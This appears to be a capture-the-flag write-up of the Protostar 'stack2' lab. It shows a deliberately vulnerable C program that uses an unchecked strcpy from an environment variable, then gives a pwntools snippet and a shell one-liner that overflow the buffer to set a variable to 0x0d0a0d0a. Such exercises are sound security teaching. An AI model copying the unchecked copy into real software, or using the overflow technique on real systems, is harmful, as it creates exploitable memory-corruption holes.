```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

`variable` is copied to `buffer`. If `variable` is long enough, then `modified` can be overflowed through copying.

```python
>>> from pwn import *
>>> p32(0x0d0a0d0a)
b'\n\r\n\r'
```

We have to use invisible characters!

Now using Python2 to make our environment variable `GREENIE`,

```shell
user@protostar:~$ GREENIE=$(python -c "print(b'a'*64)+b'\n\r\n\r'")
user@protostar:~$ export GREENIE
user@protostar:~$ ./stack2
you have correctly modified the variable
```

